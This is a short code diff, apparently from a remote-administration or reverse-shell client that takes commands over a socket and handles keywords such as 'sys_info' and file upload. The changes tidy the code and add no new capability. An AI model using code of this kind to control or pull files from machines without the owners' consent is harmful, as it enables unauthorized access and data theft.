@@ -21,7 +21,7 @@ def main():
             cmd = utils.recv_data(s)
 
             if cmd.strip() == 'exit':
-                utils.send_data(s, b'[+] Terminating remote session.')
+                utils.send_data(s, '[+] Terminating remote session.')
                 break
 
             out = handle_cmd(cmd)
@@ -44,7 +44,7 @@ def handle_cmd(cmd):
 
     # get system information
     if keyword == 'sys_info':
-        s.sendall(utils.sys_info())
+        return utils.sys_info()
 
     # upload a file
 
